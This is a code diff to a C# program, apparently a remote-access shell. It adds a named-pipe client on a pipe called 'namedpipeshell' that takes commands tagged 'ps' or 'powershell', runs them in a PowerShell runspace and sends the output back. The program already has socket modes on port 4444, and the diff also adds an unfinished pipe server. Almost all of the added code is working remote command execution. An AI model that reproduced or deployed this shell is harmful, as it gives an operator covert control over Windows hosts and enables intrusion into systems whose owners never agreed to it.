@@ -7,10 +7,15 @@ using System.Net;
 using System.Net.Sockets;
 using System.Globalization;
 using System.Text.RegularExpressions;
+using System.IO.Pipes;
+using System.IO;
+using System.Collections.ObjectModel;
+using System.Management.Automation.Runspaces;
+using System.Security.Principal;
 
 namespace myclient
 {
-    
+
     class MyApp
     {
         private string t_message = "";
@@ -72,6 +77,24 @@ namespace myclient
                     t_message = t_message + Encoding.ASCII.GetString(bytes, 0, bytesRec);
 
                 }
+            }
+        }
+
+        private static byte[] ReadPipMessage(PipeStream pipe)
+        {
+            byte[] buffer = new byte[1024];
+            using (var ms = new MemoryStream())
+            {
+                do
+                {
+                    //Console.WriteLine("Into pipe read ...");
+                    var readBytes = pipe.Read(buffer, 0, buffer.Length);
+                    ms.Write(buffer, 0, readBytes);
+
+                }
+                while (!pipe.IsMessageComplete);
+
+                return ms.ToArray();
             }
         }
 
@@ -200,6 +223,144 @@ namespace myclient
             }//end of while 
         }
 
+
+        private void doMagic(PipeStream pipe)
+        {
+
+            //init
+            PsRun myPsRun = new PsRun();
+            myPsRun.init();
+
+
+            string command_tag;
+            string command;
+
+            while (true)
+            {
+                Console.WriteLine("[*] Waiting for pip message");
+                var messageBytes = ReadPipMessage(pipe);
+                command_tag = Encoding.ASCII.GetString(messageBytes);
+                Console.WriteLine("[*] Tag Received: {0}", command_tag);
+
+                //ack
+                byte[] msg = Encoding.ASCII.GetBytes("COMMAND_TAG_SUCCESS");
+                pipe.Write(msg, 0, msg.Length);
+                Console.WriteLine("[*] Ack Sent..");
+
+
+                messageBytes = ReadPipMessage(pipe);
+                command = Encoding.ASCII.GetString(messageBytes);
+                Console.WriteLine("[*] CMD Received: {0}", command);
+
+                //ack
+                msg = Encoding.ASCII.GetBytes("COMMAND_SUCCESS");
+                pipe.Write(msg, 0, msg.Length);
+                Console.WriteLine("[*] Ack Sent..");
+
+
+                if (command_tag.ToLower() == "ps" || command_tag.ToLower() == "powershell")
+                {
+
+                    string psresult = "";
+                    try
+                    {
+                        psresult = myPsRun.doPsRun(command);
+                    }
+                    catch (Exception e)
+                    {
+                        psresult = psresult + "[ERROR]: " + e.Message;
+                    }
+
+
+                    try
+                    {
+                        msg = Encoding.ASCII.GetBytes(psresult);
+                        pipe.Write(msg, 0, msg.Length);
+                        messageBytes = ReadPipMessage(pipe);
+
+                        //ack
+                        var psAck = Encoding.ASCII.GetString(messageBytes);
+                        Console.WriteLine("[DEBUG] ACK msg: " + psAck);
+                        if (psAck == "PSRUN_SUCCESS")
+                        {
+                            Console.WriteLine("[PsRun] Success");
+                        }
+                        else
+                        {
+                            Console.WriteLine("[PsRun] Failed ...");
+                        }
+
+                    }
+                    catch
+                    {
+                        Console.WriteLine("[!] Pipe is broken!");
+                        //do something to restore
+                    }
+
+
+
+                }//end of if ps
+
+                if (command_tag.ToLower() == "exit")
+                {
+                    break;
+                }
+
+
+
+            }//end of while 
+
+        }
+
+        public void StartPipeClinet()
+        {
+
+
+            try
+            {
+                Console.WriteLine("[*] Trying connect to server");
+                var pipe = new NamedPipeClientStream(".", "namedpipeshell", PipeDirection.InOut);
+                pipe.Connect(5000);
+                pipe.ReadMode = PipeTransmissionMode.Message;
+                Console.WriteLine("[*] Connected to server.");
+                doMagic(pipe);
+
+
+
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.ToString());
+            }
+
+        }
+
+
+            public void StartPipServer()
+        {
+
+            //init
+            PsRun myPsRun = new PsRun();
+            myPsRun.init();
+
+
+            string command_tag;
+            string command;
+
+            try
+            {
+                var pipe = new NamedPipeServerStream("namedpipeshell", PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message);
+                Console.WriteLine("[*] Waiting for client connection...");
+                pipe.WaitForConnection();
+                Console.WriteLine("[*] Client connected.");
+
+            }//end of try
+            catch (Exception e)
+            {
+                Console.WriteLine(e.ToString());
+            }
+        }
+
         public void StartClient()
         {
 
@@ -225,7 +386,7 @@ namespace myclient
                     Console.WriteLine("Socket connected to {0}", sender.RemoteEndPoint.ToString());
 
                     //do the magic
-                    doMagic(sender, remoteEP,null);
+                    doMagic(sender, remoteEP, null);
 
                     // Release the socket.  
                     sender.Shutdown(SocketShutdown.Both);
@@ -251,7 +412,7 @@ namespace myclient
             try
             {
                 IPEndPoint localEndPoint = CreateIPEndPoint("127.0.0.1:4444");
-                Socket listener = new Socket(localEndPoint.AddressFamily,SocketType.Stream, ProtocolType.Tcp);
+                Socket listener = new Socket(localEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
 
                 try
                 {
@@ -283,7 +444,7 @@ namespace myclient
 
         }
     }
-    
+
     class Program
     {
 
@@ -291,7 +452,8 @@ namespace myclient
         {
             MyApp t_app = new MyApp();
             //t_app.StartClient();
-            t_app.StartServer();
+            //t_app.StartServer();
+            t_app.StartPipeClinet();
         }
     }
 }
